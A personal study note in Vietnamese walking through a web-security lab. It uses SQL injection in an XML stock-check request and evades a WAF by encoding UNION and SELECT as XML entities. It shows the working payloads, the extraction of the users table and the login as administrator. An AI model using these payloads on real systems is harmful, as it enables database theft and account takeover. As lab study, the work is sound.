![[lab-sqli-filter-bypass.png]]
Lab filter bypass qua XML encoding, WAF chặn UNION SELECT nên phải encode.

> [!NOTE] phân tích đề
> - stock check dùng XML, param storeId dính SQLi.
> - WAF chặn từ khóa UNION, SELECT.
> - sau khi quan sát gói tin stock này, mình thấy keyword UNION/SELECT bị WAF chặn nhưng server lại decode XML entity trước khi ghép query, nên mình encode chữ cái đầu để qua mặt WAF.
> - liên quan [[các kỹ thuật chèn sql]] và [[SQL cheet sheet]].

### hướng giải
- [ ] intercept POST /product/stock.
- [ ] thử `1 UNION SELECT ...` xem bị chặn không.
- [ ] encode `U` thành `&#x55;`, `S` thành `&#x53;`.
- [ ] đếm cột rồi dump users.
- [ ] login administrator.

### giải
request gốc:
```xml
POST /product/stock HTTP/1.1
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```
-> trả về stock bình thường.

request bị chặn:
```xml
<storeId>1 UNION SELECT username, password FROM users--</storeId>
```
-> WAF 403 / stripped.
=> phải obfuscate.

payload bypass:
```xml
<storeId>1 &#x55;NION &#x53;ELECT username, password FROM users--</storeId>
```
-> `&#x55;` = U, `&#x53;` = S.
-> WAF thấy `NION`, `ELECT` nên cho qua.
-> backend decode thành `UNION SELECT`.
=> response ói ra:
```
administrator ... 8t2k6m4x1p9q3w7z5r0v
```
-> mình lụm password administrator.
-> login là solved.

lệnh verify số cột trước cũng phải encode:
```xml
<storeId>1 &#x55;NION &#x53;ELECT 'a','b'--</storeId>
```
-> hiện `a`, `b` là biết 2 cột text.

> [!NOTE] bài học
> - WAF check thô thì encode là qua.
> - XML entity là chỗ núp ngon.
> - sau bài này quay lại [[0-index SQL injection]] ôn từ đầu.
